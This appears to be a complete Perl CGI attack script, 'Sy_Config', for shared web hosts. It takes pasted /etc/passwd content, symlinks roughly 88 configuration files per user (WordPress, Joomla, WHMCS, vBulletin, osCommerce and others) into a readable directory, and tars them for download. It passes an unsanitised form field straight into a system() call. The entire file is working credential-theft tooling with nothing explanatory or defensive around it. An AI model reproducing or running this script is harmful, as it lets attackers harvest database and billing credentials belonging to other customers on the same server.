#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Sy_Config</title>
<style type="text/css">
.newStyle1 {
 font-family: Tahoma;
 font-size: x-large;
 color: #000000;
 background-color: #C0C0C0;
 text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$kola=$msr."/".$user;
$kola=~s/\n//g;
symlink('/home/'.$user.'/public_html/includes/configure.php',$kola.'1.txt');
symlink('/home/'.$user.'/public_html/os/includes/configure.php',$kola.'2.txt');
symlink('/home/'.$user.'/public_html/oscom/includes/configure.php',$kola.'3.txt');
symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.'4.txt');
symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.'5.txt');
symlink('/home/'.$user.'/public_html/shop/includes/configure.php',$kola.'6.txt');
symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$kola.'7.txt');
symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$kola.'8.txt');
symlink('/home/'.$user.'/public_html/amember/config.inc.php',$kola.'9.txt');
symlink('/home/'.$user.'/public_html/config.inc.php',$kola.'10.txt');
symlink('/home/'.$user.'/public_html/members/configuration.php',$kola.'11.txt');
symlink('/home/'.$user.'/public_html/config.php',$kola.'12.txt');
symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'13.txt');
symlink('/home/'.$user.'/public_html/forums/includes/config.php',$kola.'14.txt');
symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.'15.txt');
symlink('/home/'.$user.'/public_html/admin/config.php',$kola.'16.txt');
symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'17.txt');
symlink('/home/'.$user.'/public_html/wp/wp-config.php',$kola.'18.txt');
symlink('/home/'.$user.'/public_html/WP/wp-config.php',$kola.'19.txt');
symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$kola.'20.txt');
symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.'21.txt');
symlink('/home/'.$user.'/public_html/press/wp-config.php',$kola.'22.txt');
symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$kola.'23.txt');
symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$kola.'24.txt');
symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.'25.txt');
symlink('/home/'.$user.'/public_html/news/wp-config.php',$kola.'26.txt');
symlink('/home/'.$user.'/public_html/new/wp-config.php',$kola.'27.txt');
symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'28.txt');
symlink('/home/'.$user.'/public_html/beta/wp-config.php',$kola.'29.txt');
symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$kola.'30.txt');
symlink('/home/'.$user.'/public_html/home/wp-config.php',$kola.'31.txt');
symlink('/home/'.$user.'/public_html/protal/wp-config.php',$kola.'32.txt');
symlink('/home/'.$user.'/public_html/site/wp-config.php',$kola.'33.txt');
symlink('/home/'.$user.'/public_html/main/wp-config.php',$kola.'34.txt');
symlink('/home/'.$user.'/public_html/test/wp-config.php',$kola.'35.txt');
symlink('/home/'.$user.'/public_html/conf_global.php',$kola.'36.txt');
symlink('/home/'.$user.'/public_html/include/db.php',$kola.'37.txt');
symlink('/home/'.$user.'/public_html/connect.php',$kola.'38.txt');
symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.'39.txt');
symlink('/home/'.$user.'/public_html/include/config.php',$kola.'40.txt');
symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'41.txt');
symlink('/home/'.$user.'/public_html/protal/configuration.php',$kola.'42.txt');
symlink('/home/'.$user.'/public_html/joo/configuration.php',$kola.'43.txt');
symlink('/home/'.$user.'/public_html/cms/configuration.php',$kola.'44.txt');
symlink('/home/'.$user.'/public_html/site/configuration.php',$kola.'45.txt');
symlink('/home/'.$user.'/public_html/main/configuration.php',$kola.'46.txt');
symlink('/home/'.$user.'/public_html/news/configuration.php',$kola.'47.txt');
symlink('/home/'.$user.'/public_html/new/configuration.php',$kola.'48.txt');
symlink('/home/'.$user.'/public_html/home/configuration.php',$kola.'49.txt');
symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'50.txt');
symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$kola.'51.txt');
symlink('/home/'.$user.'/public_html/includes/config.php',$kola.'52.txt');
symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'53.txt');
symlink('/home/'.$user.'/public_html/central/configuration.php',$kola.'54.txt');
symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$kola.'55.txt');
symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$kola.'56.txt');
symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$kola.'57.txt');
symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$kola.'58.txt');
symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'59.txt');
symlink('/home/'.$user.'/public_html/supp/configuration.php',$kola.'60.txt');
symlink('/home/'.$user.'/public_html/secure/configuration.php',$kola.'61.txt');
symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$kola.'62.txt');
symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$kola.'63.txt');
symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$kola.'64.txt');
symlink('/home/'.$user.'/public_html/panel/configuration.php',$kola.'65.txt');
symlink('/home/'.$user.'/public_html/host/configuration.php',$kola.'66.txt');
symlink('/home/'.$user.'/public_html/hosting/configuration.php',$kola.'67.txt');
symlink('/home/'.$user.'/public_html/hosts/configuration.php',$kola.'68.txt');
symlink('/home/'.$user.'/public_html/configuration.php',$kola.'69.txt');
symlink('/home/'.$user.'/public_html/submitticket.php',$kola.'70.txt');
symlink('/home/'.$user.'/public_html/clients/configuration.php',$kola.'71.txt');
symlink('/home/'.$user.'/public_html/client/configuration.php',$kola.'72.txt');
symlink('/home/'.$user.'/public_html/clientes/configuration.php',$kola.'73.txt');
symlink('/home/'.$user.'/public_html/cliente/configuration.php',$kola.'74.txt');
symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$kola.'75.txt');
symlink('/home/'.$user.'/public_html/billing/configuration.php',$kola.'76.txt'); 
symlink('/home/'.$user.'/public_html/manage/configuration.php',$kola.'77.txt'); 
symlink('/home/'.$user.'/public_html/my/configuration.php',$kola.'78.txt'); 
symlink('/home/'.$user.'/public_html/myshop/configuration.php',$kola.'79.txt'); 
symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$kola.'80.txt'); 
symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.'81.txt'); 
symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.'82.txt'); 
symlink('/home/'.$user.'/public_html/Settings.php',$kola.'83.txt'); 
symlink('/home/'.$user.'/public_html/smf/Settings.php',$kola.'84.txt'); 
symlink('/home/'.$user.'/public_html/forum/Settings.php',$kola.'85.txt'); 
symlink('/home/'.$user.'/public_html/forums/Settings.php',$kola.'86.txt'); 
symlink('/home/'.$user.'/public_html/upload/includes/config.php',$kola.'87.txt'); 
symlink('/home/'.$user.'/public_html/up/includes/config.php',$kola.'88.txt'); 
}
if ($ENV{'REQUEST_METHOD'} eq 'POST') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
} else {
  $buffer = $ENV{'QUERY_STRING'};
}
@pairs = split(/&/, $buffer);
foreach $pair (@pairs) {
  ($name, $value) = split(/=/, $pair);
  $name =~ tr/+/ /;
  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $value =~ tr/+/ /;
  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
  $FORM{$name} = $value;
}
if ($FORM{pass} eq ""){
print '
<body class="newStyle1">
<p> Symlink All Configs </p>
<p> :::Put The File Content ( /etc/passwd ) Here :::</p>
<form method="post">
<textarea name="pass" style="width: 543px; height: 420px"></textarea>
<br />
<input name="tar" type="text" style="width: 212px" /><br />
<input name="Submit1" type="submit" value="submit" style="width: 99px" /><br />
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1">
<p>Done !!</p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar">Click here 2 download tar file</a></p>';
}
}
 print"
</body>
</html>";
